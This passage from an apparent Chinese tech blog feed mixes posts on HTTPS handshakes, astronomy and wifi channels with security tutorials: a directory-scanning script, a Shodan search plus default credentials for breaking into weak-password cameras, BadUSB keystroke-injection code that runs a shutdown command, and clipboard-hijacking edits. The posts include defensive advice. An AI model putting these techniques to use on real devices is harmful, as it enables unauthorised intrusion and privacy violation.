= line.replace(&#39;\n&#39;,&#39;&#39;)        url = html + line        url_list.append(url)    return url_listdef main():    html = &#39;http://www.uuzdaisuki.com/&#39;    dic = open(r&quot;C:\Users\leticia\desktop\dic.txt&quot;,&#39;r&#39;)    url_list = []    real_list = []    url_list = add_url(html,dic,url_list)    real_list = guesshtml(url_list,real_list)main()</code></pre><p>单线程运行结果：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/pythonpython_houtai1.png"><br>0x03 多线程实现</p><hr><pre><code class="python">import requestsfrom threading import Threaddef guesshtml(url,real_list):    r = requests.get(url, timeout=30)    if r.status_code==200:        print(&quot;存在: &quot;+url)        real_list.append(url)    else:         print(&quot;不存在: %s 错误代码: %d&quot;% (url,r.status_code))    return real_listdef add_url(html,dic,url_list):    for line in dic:        line = line.replace(&#39;\n&#39;,&#39;&#39;)        url = html + line        url_list.append(url)    return url_listdef main():    html = &#39;http://www.uuzdaisuki.com/&#39;    dic = open(r&quot;C:\Users\leticia\desktop\dic.txt&quot;,&#39;r&#39;)    url_list = []    real_list = [] #这个暂时没有用到，如果我们需要保存的时候，再用这里。    url_list = add_url(html,dic,url_list)    for url in url_list:        t = Thread(target = guesshtml,args=(url,real_list))        t.start()main()</code></pre><p>多线程运行结果:<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/pythonpython_houtai2.png"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>https握手详解</title>
    <link href="/2017/11/25/https%E6%8F%A1%E6%89%8B%E8%AF%A6%E8%A7%A3/"/>
    <url>/2017/11/25/https%E6%8F%A1%E6%89%8B%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是https协议"><a href="#0x00-什么是https协议" class="headerlink" title="0x00 什么是https协议"></a>0x00 什么是https协议</h2><p>HTTPS（全称：Hyper Text Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL，因此加密的详细内容就需要SSL。 它是一个URI scheme（抽象标识符体系），句法类同http:体系。用于安全的HTTP数据传输。  </p><h2 id="0x01-HTTPS和HTTP的区别"><a href="#0x01-HTTPS和HTTP的区别" class="headerlink" title="0x01 HTTPS和HTTP的区别"></a>0x01 HTTPS和HTTP的区别</h2><p>HTTPS和HTTP的区别主要为以下四点：  </p><ul><li>https协议需要到ca申请证书，一般免费证书很少，需要交费。</li><li>http是超文本传输协议，信息是明文传输，https 则是具有安全性的ssl加密传输协议。</li><li>http和https使用的是完全不同的连接方式，用的端口也不一样，前者是80，后者是443。</li><li>http的连接很简单，是无状态的；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。  </li></ul><h2 id="0x02-SSL协议"><a href="#0x02-SSL协议" class="headerlink" title="0x02 SSL协议"></a>0x02 SSL协议</h2><p>SSL(Secure Sockets Layer 安全套接层),及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS与SSL在传输层对网络连接进行加密。<br>所以SSL所具备的功能是：保证传输数据的保密性、完整性，并且实现通信双方的身份认证。<br>在协议栈种位置如下：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/1.png"><br>SSL协议是一个分层协议，共有两层组成。  </p><p>高层协议包括：  </p><ul><li>SSL握手协议</li><li>改变加密约定协议</li><li>报警协议</li></ul><p>底层协议是SSL记录层协议，是一个简单的封装协议，用来记录协议的功能，保证协议的完整性，机密性。</p><h2 id="0x03-SSL握手"><a href="#0x03-SSL握手" class="headerlink" title="0x03 SSL握手"></a>0x03 SSL握手</h2><p>这里主要分析一下高层协议中的握手协议。<br>SSL握手协议主要负责：</p><ul><li>算法协商</li><li>身份验证</li><li>确定密钥  </li></ul><p>为了很直观的看到它具体做了什么，采用wireshark抓包的方式来分析一次Full Handshake，即全流程握手。  </p><h2 id="0x04-wireshark抓包分析"><a href="#0x04-wireshark抓包分析" class="headerlink" title="0x04 wireshark抓包分析"></a>0x04 wireshark抓包分析</h2><p>接下来我们抓包进行分析：  </p><p>1.我们打开wireshark软件，监视正在使用的网卡，然后通过浏览器访问 <a href="http://www.github.com/">www.github.com</a> 抓取完成后我们停止捕获。  </p><p>2.在过滤器输入ssl，过滤ssl协议，找到本机向 github.com 的ip地址发起的client hello。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/2.png">  </p><p>3.右键追踪，选择ssl流。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/3.png">  </p><p>4.首先是client hello，这个包携带着客户的SSL版本号，加密套件列表，压缩算法列表，客户端随机数，sessionid = 0，传送给服务器。<br>我们开始分析，首先展开client hello的SSL，找到Handshark。可以看到client hello里面包含的各项数据。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/4.png"></p><p>  分别是：  </p><ul><li>SSL版本号:TLS 1.2</li><li>压缩算法NULL</li><li>sessionid = 0</li><li>密码套件如下  </li></ul><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/5.png">  </p><ul><li>server name，可以看到是 github.com。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/6.png">  </li></ul><p>5.然后找到server hello，这个包是服务器选择版本，确定要用的加密套件，压缩算法，计算sessionid以及随机数，发送给客户端。  </p><p>同样展开SSL：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/7.png"><br>我们可以看到各项对应数据被放在server hello中，比如session ID，密码套件等。</p><p>并且我们看到，除了server hello部分，这个包还有服务器发向客户端的证书的前一部分。然后下一个包TCP segment of a reassemble PDU，是证书的中间部分。  </p><p>6.然后找到Certificate，这一步是服务端将自己的证书下发给客户端，让客户端验证自己的身份，客户端验证通过后取出证书中的公钥。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/8.png">  </p><p>而我们看到的包中内容呢是证书结尾部分，包括GitHub 机构旗下github.com网站的证书及其颁发机构 DigiCert 的证书。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/9.png">  </p><p>7.下一部分是Server Key Exchange，用于将服务器的临时ECDH公钥传送给客户端。 </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/10.png">  </p><p>8.之后是Server Hello Done，此消息由服务器发送，以指示ServerHello和相关消息的结束。<br>发送此消息后，服务器将等待客户端响应。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/11.png"></p><p>9.客户端收到服务端传来的证书后，先从 CA 验证该证书的合法性，验证通过后取出证书中的服务端公钥，再生成一个随机数 Random3，再用服务端公钥非对称加密 Random3 生成 PreMaster Key。  </p><p>然后我们看到下个包包含Client Key Exchange, Change Cipher Spec, Hello Request, Hello Request  </p><p>10.首先是Client Key Exchange，上面客户端根据服务器传来的公钥生成了 PreMaster Key，Client Key Exchange 就是将这个 key 传给服务端。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/12.png">  </p><p>11.Change Cipher Spec(Client)，<br>这一步是客户端通知服务端后面再发送的消息都会使用前面协商出来的秘钥加密了。然后客户端发送握手验证报文确保消息的完整性。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/13.png"> </p><p>12.Change Cipher Spec(Server)<br>这一步是服务端收到数据后，通知客户端后面再发送的消息都会使用加密。  </p><p>13.Encrypted Handshake Message，表示服务器端的SSL成功结束，发送握手验证报文确保消息的完整性。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/14.png">  </p><p>14.下面开始正式交换数据。</p><p>所以总的过程如下图所示：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/https/15.png">  </p><p>以上就是整个SSL握手过程，也是加密算法的典型应用之一。</p>]]></content>
    
    
    <categories>
      
      <category>网络协议</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络协议</tag>
      
      <tag>https</tag>
      
      <tag>ssl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>天体距离测量</title>
    <link href="/2017/11/09/%E5%A4%A9%E4%BD%93%E8%B7%9D%E7%A6%BB%E6%B5%8B%E9%87%8F/"/>
    <url>/2017/11/09/%E5%A4%A9%E4%BD%93%E8%B7%9D%E7%A6%BB%E6%B5%8B%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p>我们经常在新闻里听说：距离地球XX光年发生超新星爆炸，距离地球XX光年发现类地行星。且不管新闻真假，真空中电磁波速度是c，要真的用雷达测量几十光年几百光年的距离是不可能实现的，那我们看到这些报道的时候有没有曾怀疑过这些距离是怎么测算的呢？  </p><h2 id="0x01-天文学距离单位介绍"><a href="#0x01-天文学距离单位介绍" class="headerlink" title="0x01 天文学距离单位介绍"></a>0x01 天文学距离单位介绍</h2><p>谈到距离，肯定离不开距离单位，我们平时用到的距离单位放在天体的层面运算的话实在是令人头疼的事情，所以我们经常使用天文单位、光年、秒差距这些单位。  </p><ul><li>天文单位（AU）：即太阳和地球之间的平均距离，约1.5亿公里。</li><li>光年（ly）：光在宇宙真空中沿直线传播了一儒略年（365.25天）时间的距离，约94607亿千米.</li><li>秒差距（pc）：以地球公转轨道的平均半径（一个天文单位）为底边所对应的三角形内角称为周年视差。当这个角的大小为1角秒时，这个三角形的一条边的长度（地球到这个恒星的距离）就称为1秒差距。约为3.26光年。</li></ul><p>前两个单位我们经常见到，第三个很多不了解的人看了上面的定义也很迷糊，简单的说，1秒差距是周年视差为1”时天体的距离。</p><h2 id="0x02-周年视差"><a href="#0x02-周年视差" class="headerlink" title="0x02 周年视差"></a>0x02 周年视差</h2><p>而秒差距中所说的周年视差又是什么？在说周年视差的概念之前我们先来看看视差是什么。<br>视差就是从有一定距离的两个点上观察同一个目标所产生的方向差异。从目标看两个点之间的夹角，叫做这两个点的视差角，两点之间的距离称作基线。只要知道视差角度和基线长度，就可以计算出目标和观测者之间的距离。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tianwen/01.jpg">  </p><p>就像当你伸出一个手指放在眼前，先闭上右眼，用左眼看它；再闭上左眼，用右眼看它，会发现手指相对远方的物体的位置有了变化，这就是从不同角度去看同一点的视差。<br>而周年视差则是地球绕太阳周年运动的直径作为这个“左右眼”的距离，看天体所产生的视差。<br>即当恒星与太阳的连线垂直地球轨道半径时，恒星对日地平均距离d所张的角ρ叫恒星的周年视差。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/tianwen/02.jpg">  </p><h2 id="0x03-天体距离的计算"><a href="#0x03-天体距离的计算" class="headerlink" title="0x03 天体距离的计算"></a>0x03 天体距离的计算</h2><p>介绍了上面的这些定义，我们来看看天体距离的计算<br>当ρ为被测天体相对地球轨道半长径的夹角，a为地球公转轨道半长轴，d为天体距离时，距离的计算是：<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/03.png"></p><p>在这里角度极小情况下sin（ρ）近似为ρ，a为一个天文单位，所以最终距离为周年视差（以秒为单位时）的倒数倍的秒差距。<br>比如我们的比邻星周年视差为0.76”，则计算距离时：<br>0.76的倒数为1.32，所以1.32倍的秒差距（3.26光年）为4.3光年。<br>而建立空间卫星能提升观测距离的真正原因就是因为地面上的望远镜受到大气层影响太大，角分辨率一般不到0.01”，而2013年发射的盖亚空间卫星的角分辨率可以达到0.00001”，大大的增加了观测距离。<br><img src="http://oo3iot5oz.bkt.clouddn.com/tianwen/04.jpg" alt="盖亚卫星">  </p><h2 id="0x04-宇宙距离阶梯"><a href="#0x04-宇宙距离阶梯" class="headerlink" title="0x04 宇宙距离阶梯"></a>0x04 宇宙距离阶梯</h2><p>虽然通过之前的办法可以观测到很远的地方，但是宇宙的广袤远远超出我们的想像，再远的地方怎么办呢？对于更远的地方，人类就有了其他的观测方案。<br><img src="http://oo3iot5oz.bkt.clouddn.com/tianwen/05.png" alt="宇宙距离阶梯">  </p><p>在一系列的方法之下，哈勃望远镜眼中的宇宙深处，我们能够观察的宇宙空间直径大约是930亿光年，这个数字是这样得出的：那些从138亿光年外发出的光线，产生这些光线的古老天体，由于宇宙的膨胀，今天它们和我们之间的距离已经达到了大约465亿光年左右。这是我们能观测到的极限半径，乘以二则是我们能够观察的宇宙空间直径，约930亿光年。</p>]]></content>
    
    
    <categories>
      
      <category>天文学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>天文学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搜索引擎黑客之通过shodan入侵弱口令网络摄像头</title>
    <link href="/2017/10/29/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%BB%91%E5%AE%A2%E4%B9%8B%E9%80%9A%E8%BF%87shodan%E5%85%A5%E4%BE%B5%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4/"/>
    <url>/2017/10/29/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E9%BB%91%E5%AE%A2%E4%B9%8B%E9%80%9A%E8%BF%87shodan%E5%85%A5%E4%BE%B5%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是搜索引擎黑客"><a href="#0x00-什么是搜索引擎黑客" class="headerlink" title="0x00 什么是搜索引擎黑客"></a>0x00 什么是搜索引擎黑客</h2><p>搜索引擎（Search Engine）是指根据一定的策略、运用特定的计算机程序从互联网上搜集信息，在对信息进行组织和处理后，为用户提供检索服务，将用户检索相关的信息展示给用户的系统。搜索引擎包括全文索引、目录索引、元搜索引擎、垂直搜索引擎、集合式搜索引擎、门户搜索引擎与免费链接列表等。<br>它是通过爬虫机器人不停的在爬世界所有网站，私人的一些重要数据即使没有对外公布，但是极有可能已经被搜索引擎爬到了。这个时候通过搜索引擎的妙用，就可以很轻松的获取你的重要个人信息。  </p><h2 id="0x01-百度谷歌等工具的使用"><a href="#0x01-百度谷歌等工具的使用" class="headerlink" title="0x01 百度谷歌等工具的使用"></a>0x01 百度谷歌等工具的使用</h2><p>首先来讲一下平时经常用到的搜索引擎：</p><ul><li>百度：<a href="http://www.baidu.com/">www.baidu.com</a></li><li>google: <a href="http://www.google.com/">www.google.com</a></li><li>俄罗斯的yandex：<a href="http://www.yandex.com/">www.yandex.com</a></li></ul><p>平时关键字搜索大家都会就不再赘述，这里主要讲一下百度的一些小技巧：  </p><p>1.加减字符的运用<br>用法： 用“+”包含特定查询词，用“-”排除特定查询词<br>例如：ted +pixiv -演讲<br>我们要搜一个画师的id，不加参数的时候很难找到:  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/1.png"><br>加了之后就很容易找到相关内容了:  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/2.png"><br>2.intitle搜索范围限定在网页标题<br>用法： intitle:xxx<br>3.site搜索范围限定在特定站点中<br>用法： site:xxx<br>4.inurl搜索范围限定在url链接中<br>用法： inurl:xxx<br>5.Filetype搜索范围限定在指定文档格式中<br>用法： Filetype:xxx  </p><p>当然，如果一般windows用户不习惯使用这些语法的话，可以选择去<br><a href="https://www.baidu.com/gaoji/advanced.html">https://www.baidu.com/gaoji/advanced.html</a><br>进行高级搜索  </p><p>google的操作基本一致，这里给一个利用谷歌语法的黑客数据库<br><a href="https://www.exploit-db.com/google-hacking-database/">https://www.exploit-db.com/google-hacking-database/</a><br>0x02 shodan的基本操作</p><hr><p>这里是shodan的地址<br><a href="https://www.shodan.io/">https://www.shodan.io/</a><br>接下来我们看看什么是shodan<br>在百度百科里面给出了这么一句话：Shodan是互联网上最可怕的搜索引擎。<br>虽然目前人们都认为谷歌是最强劲的搜索引擎，但Shodan才是互联网上最可怕的搜索引擎。与谷歌不同的是，Shodan不是在网上搜索网址，而是直接进入互联网的背后通道。Shodan可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月Shodan都会在大约5亿个服务器上日夜不停地搜集信息。<br>我们平时的搜索引擎谷歌百度爬的是网页信息，而shodan爬的是互联网设备和端口。这就造成了什么情况呢？现在智能家电越来越多，有很多会连接到互联网，而shodan就能查找到这些设备，然后不法分子可能就会对这些生活中重要的设备进行入侵，这是十分危险的。</p><h2 id="0x03-入侵网络摄像头"><a href="#0x03-入侵网络摄像头" class="headerlink" title="0x03 入侵网络摄像头"></a>0x03 入侵网络摄像头</h2><p>做了这么多铺垫，我们来体验一下shodan，入侵一下网络上弱口令的摄像头。<br>首先打开shodan，注册个账号，这样才能使用过滤，然后我们在搜索框输入：Hikvision-Webs country:”CN” city:”Nanjing”<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/3.png"><br>这句话是搜索所有地点为中国南京的海康威视摄像头设备，我们搜索到很多结果，下来我们点击某些设备的index打开它的后台界面，海康威视的默认账号是admin，密码是12345，我们可以写个python脚本批量测试，也可以写个弱口令字典，用python脚本对这些设备进行暴力破解（前面的博客写过一些这类脚本，只需稍作更改）。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/4.png"><br>如图是一个已被破解的摄像头管理界面，而且是管理员权限，在这里我们可以查看摄像头拍摄的界面和更改各种设置。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/hk/5.png"><br>点击预览、回放等就可以查看摄像头内容了，但是谨记这会侵犯别人的隐私权，是违法的行为，我们是遵纪守法的好公民所以知道它的原理和危害就足够。运用技术保护好个人隐私，如非必要不将摄像头接入互联网，一定要接入的话，不能使用容易被破解的弱口令。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>硬件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>模拟键盘攻击——BadUSB制作</title>
    <link href="/2017/10/15/%E6%A8%A1%E6%8B%9F%E9%94%AE%E7%9B%98%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94BadUSB%E5%88%B6%E4%BD%9C/"/>
    <url>/2017/10/15/%E6%A8%A1%E6%8B%9F%E9%94%AE%E7%9B%98%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94BadUSB%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-什么是BadUSB"><a href="#0x00-什么是BadUSB" class="headerlink" title="0x00 什么是BadUSB"></a>0x00 什么是BadUSB</h2><p>BadUSB主要依靠USB拇指驱动器的构建方式，USB通常有一个大的可重写的内存芯片用于实际的数据存储，以及一个独立的控制器芯片。类似于笔记本电脑的硬盘驱动器包含一个隐藏的主引导记录(Master Boot Record)，内存芯片中内存单元的第一段包含让USB记录的编程，也就是说他不是利用普通u盘的autorun.inf，不会被检测到，这样攻击者植入恶意软件就不会被发现。  </p><h2 id="0x01-USB协议漏洞"><a href="#0x01-USB协议漏洞" class="headerlink" title="0x01 USB协议漏洞"></a>0x01 USB协议漏洞</h2><p>现在的USB设备很多，比如音视频设备、摄像头等，因此要求系统提供最大的兼容性，甚至免驱；所以在设计USB标准的时候没有要求每个USB设备像网络设备那样占有一个唯一可识别的MAC地址让系统进行验证，而是允许一个USB设备具有多个输入输出设备的特征。这样就可以通过重写U盘固件，伪装成一个USB键盘，并通过虚拟键盘输入集成到U盘固件中的指令和代码而进行攻击。  </p><h2 id="0x02-需要的工具"><a href="#0x02-需要的工具" class="headerlink" title="0x02 需要的工具"></a>0x02 需要的工具</h2><ul><li>一块Arduino leonardo开发板，选择他是因为板子体积小容易包装成一个普通的u盘，并且代码非常好书写。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/1.jpg"></li><li>Arduino ide，我们需要用它写代码并且烧录到badusb里面。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/2.png"></li><li>外壳，将它包装的像一个普通u盘，不然这么块板子谁电脑会让你随便插，当然你也可以直接去淘宝购买已经包装好的badusb。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/badusb/3.png"></li></ul><h2 id="0x03-写入代码"><a href="#0x03-写入代码" class="headerlink" title="0x03 写入代码"></a>0x03 写入代码</h2><p>我们通过keyboard.h库里面提供的方法模拟键盘输入。如果进攻对象是windows的话，首先win+r然后输入cmd，进入命令行，这个时候几乎可以做到所有事情。如果进攻对象是linux，一般是ctrl+alt+t的组合开启terminal然后再输入命令。无论是进入哪种，只要你预先写好代码，对目标计算机上的文件下载，上传，删除，运行······怎么做都可以。<br>这里我们给出一个windows下的无害代码，使得我们u盘插入后目标计算机十秒关机。 </p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Keyboard.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// put your setup code here, to run once:</span><br><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">begin</span>();<span class="hljs-comment">//开始键盘通讯</span><br><span class="hljs-built_in">delay</span>(<span class="hljs-number">3000</span>);<span class="hljs-comment">//延时</span><br><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(KEY_LEFT_GUI);<span class="hljs-comment">//win键</span><br><span class="hljs-built_in">delay</span>(<span class="hljs-number">50</span>);<br><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">press</span>(<span class="hljs-string">&#x27;r&#x27;</span>);<span class="hljs-comment">//r键</span><br><span class="hljs-built_in">delay</span>(<span class="hljs-number">50</span>);<br><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(KEY_LEFT_GUI);<span class="hljs-comment">//这里松开按键</span><br><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">release</span>(<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;cmd \n&quot;</span>); <span class="hljs-comment">//注意这里命令多了一个空格 如果目标终端的输入法是中文的话这个空格非常关键</span><br><span class="hljs-built_in">delay</span>(<span class="hljs-number">500</span>);<br><span class="hljs-built_in">Keyboard</span>.<span class="hljs-built_in">println</span>(<span class="hljs-string">&quot;shutdown -s -t 10 \n&quot;</span>); ; <span class="hljs-comment">//注意有一个空格</span><br><span class="hljs-built_in">delay</span>(<span class="hljs-number">1000</span>);<span class="hljs-comment">//延时</span><br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">loop</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">// put your main code here, to run repeatedly:</span><br> <br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们接入开发板，选择好串口和板子型号，按ctrl+u烧录，之后就可以用它来测试了。<br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/4.png" alt="选择端口"><br><img src="http://oo3iot5oz.bkt.clouddn.com/badusb/5.png" alt="选择型号">  </p><h2 id="0x04-扩展"><a href="#0x04-扩展" class="headerlink" title="0x04 扩展"></a>0x04 扩展</h2><p>上面只提供了一个无害代码，有危害的恶意代码我不会在这里提供，但是我们应该意识到它的危害是巨大的，在针对性的编程下，可以不知不觉拷贝你电脑的任何数据，可以偷偷的下载木马病毒并且添加到启动项，控制你的通讯工具发送消息，甚至可以越过虚拟机进攻宿主机。<br>所以usb外设提供了太多很难防御的入侵方式，存放重要数据的电脑尽量避免与人共享usb外设。</p>]]></content>
    
    
    <categories>
      
      <category>硬件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>硬件安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pastejacking粘贴劫持</title>
    <link href="/2017/10/14/Pastejacking%E7%B2%98%E8%B4%B4%E5%8A%AB%E6%8C%81/"/>
    <url>/2017/10/14/Pastejacking%E7%B2%98%E8%B4%B4%E5%8A%AB%E6%8C%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Pastejacking粘贴劫持"><a href="#Pastejacking粘贴劫持" class="headerlink" title="Pastejacking粘贴劫持"></a>Pastejacking粘贴劫持</h1><p>这是一个网站的演示，诱使用户复制无辜的命令 <a href="https://security.love/Pastejacking">https://security.love/Pastejacking</a>  </p><p>在用户浏览网页，需要复制网页上内容的时候，通过js来劫持ctrl+c或者右键复制，替换剪切板的内容。配合网页内容的特殊性和对特定用户一定程度的了解，可以达到诱导他做一些事情的目的。  </p><p>github地址:  <a href="https://github.com/dxa4481/Pastejacking">https://github.com/dxa4481/Pastejacking</a>    </p><p>上面网站的演示中只是将剪贴板内容换成了显示“evil”这种无害命令，下来我们更改一下他的代码。 下图是他替换部分的代码。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/1.png">  </p><p>在网页显示的部分我们自己改成目标可能会复制的东西，尤其对方可能会复制下来在cmd或者terminal中运行的东西，但是网页这部分看起来肯定是正常无害的。这里是稍作更改的用户能看到的界面，然后用户在这里复制。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/2.png"><br>然后在源码的这里，把括号中的内容换成调用一个有威胁的程序或者某些恶作剧命令，这里演示一下。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/5.png"><br>这里改成关机的指令或者画图的指令，然后在页面随便复制什么东西，都会被替换成这个指令，到cmd中看看效果，因为有/n的存在，粘贴时直接就被执行了。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/3.png"><br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/jacking/4.png"><br>如果将这里的命令设置成一些危险的指令，后果十分严重，所以在访问看起来并不安全的网站的时候，要仔细检查剪贴板有没有被替换。最好的办法是用firefox中NoScript等工具在禁用js的情况下访问这类网站。</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>网络安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过改变wifi信道来改善信号</title>
    <link href="/2017/09/29/%E9%80%9A%E8%BF%87%E6%94%B9%E5%8F%98wifi%E4%BF%A1%E9%81%93%E6%9D%A5%E6%94%B9%E5%96%84%E4%BF%A1%E5%8F%B7/"/>
    <url>/2017/09/29/%E9%80%9A%E8%BF%87%E6%94%B9%E5%8F%98wifi%E4%BF%A1%E9%81%93%E6%9D%A5%E6%94%B9%E5%96%84%E4%BF%A1%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="通过改变wifi信道改善信号"><a href="#通过改变wifi信道改善信号" class="headerlink" title="通过改变wifi信道改善信号"></a>通过改变wifi信道改善信号</h1><p>在路由器越来越多的今天，我们经常会发现自己的wifi信号和邻居的冲突而导致速度变慢，本文讲解下发生冲突的原因和一些改善策略。  </p><h2 id="0x00-常见wifi信道冲突的原因"><a href="#0x00-常见wifi信道冲突的原因" class="headerlink" title="0x00 常见wifi信道冲突的原因"></a>0x00 常见wifi信道冲突的原因</h2><p>目前主流的2.4Ghz无线WIFI网络设备不管是802.11b/g还是802.11b/g/n 一般都支持13个信道。它们的中心频率虽然不同，但是因为都占据一定的频率范围，所以会有一些相互重叠的情况。当路由器十分密集时，wifi信号之间互相干扰，上网体验会非常差。<br><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/1.jpg"><br>如图所示，相差五个信道以上就几乎不存在干涉，但相邻的信道重叠部分很大。<br>像博主这样在大学宿舍住的，一个宿舍一般都好几个路由器，再加上隔壁宿舍，楼上楼下以及学校提供的一些大功率热点，干扰会十分大。</p><h2 id="0x01-通过wifi分析类软件分析wifi信号"><a href="#0x01-通过wifi分析类软件分析wifi信号" class="headerlink" title="0x01 通过wifi分析类软件分析wifi信号"></a>0x01 通过wifi分析类软件分析wifi信号</h2><p>那怎么查看附近的热点信道呢？这里我们可以用到各种wifi分析软件，比如inSSIDer，KillerPerformanceSuite，netstumbler等，我在这里使用了体积最小的inSSIDer，查看了宿舍的wifi分布情况。<br>这里需要先选择无线网卡，不管是外置的还是笔记本内置的，必须选择无线网卡才能扫描。  </p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/2.png">  </p><h2 id="0x02-设置合适的wifi信道"><a href="#0x02-设置合适的wifi信道" class="headerlink" title="0x02 设置合适的wifi信道"></a>0x02 设置合适的wifi信道</h2><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/wifi/3.png">  </p><p>由图可以看出，大学宿舍的wifi分布是很密集的，所以我选择了最靠边的13信道减少冲突。<br>在平时的小区内部，路由器会相对少很多，这个时候只要避开几个邻居的信道，就可以大大减少冲突。  </p><h2 id="0x03-设置合适的频带宽度"><a href="#0x03-设置合适的频带宽度" class="headerlink" title="0x03 设置合适的频带宽度"></a>0x03 